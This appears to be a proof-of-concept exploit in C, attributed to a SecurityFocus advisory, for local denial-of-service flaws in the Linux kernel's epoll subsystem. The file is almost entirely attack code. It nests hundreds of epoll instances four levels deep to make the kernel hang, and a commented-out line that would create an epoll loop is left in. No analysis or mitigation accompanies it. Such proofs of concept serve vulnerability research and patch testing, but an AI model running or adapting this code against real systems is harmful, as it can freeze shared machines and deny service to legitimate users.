/*
source: http://www.securityfocus.com/bid/46630/info
 
The Linux Kernel epoll Subsystem is prone to multiple local denial-of-service vulnerabilities.
 
Successful exploits will allow attackers to cause the kernel to hang, denying service to legitimate users. 
*/

#include <unistd.h>
#include <sys/epoll.h>
#include <sys/time.h>
#include <stdio.h>

#define SIZE 250

int main(void) {

	int links[SIZE];
	int links2[SIZE];
	int links3[SIZE];
	int links4[SIZE];
	int i, j;
	int ret;
	int ep1, ep2;
	struct timeval start, end;

	struct epoll_event evt = {
		.events = EPOLLIN
	};

	ep1 = epoll_create(1);
	for (i = 0; i < SIZE; i++) {
		links[i] = epoll_create(1);
		ret = epoll_ctl(ep1, EPOLL_CTL_ADD, links[i], &evt);
		if (ret)
			perror("error 1");
	}
	for (i = 0; i < SIZE; i++) {
		links2[i] = epoll_create(1);
		for (j = 0; j < SIZE; j++) {
			epoll_ctl(links[j], EPOLL_CTL_ADD, links2[i], &evt);
			if (ret)
				perror("error 2");
		}
	}
	for (i = 0; i < SIZE; i++) {
		links3[i] = epoll_create(1);
		for (j = 0; j < SIZE; j++) {
			epoll_ctl(links2[j], EPOLL_CTL_ADD, links3[i], &evt);
			if (ret)
				perror("error 3");
		}
	}
	for (i = 0; i < SIZE; i++) {
		links4[i] = epoll_create(1);
		for (j = 0; j < SIZE; j++) {
			epoll_ctl(links3[j], EPOLL_CTL_ADD, links4[i], &evt);
			if (ret)
				perror("error 4");
		}
	}

 	ep2 = epoll_create(1);
	gettimeofday(&start, NULL);
	ret = epoll_ctl(ep2, EPOLL_CTL_ADD, ep1, &evt);
	/* creates a loop */
	//ret = epoll_ctl(links4[499], EPOLL_CTL_ADD, ep1, &evt);
	if (ret)
		perror("error 5");
	gettimeofday(&end, NULL);

	printf("%ld\n", ((end.tv_sec * 1000000 + end.tv_usec)
		- (start.tv_sec * 1000000 + start.tv_usec)));

	return 0;

}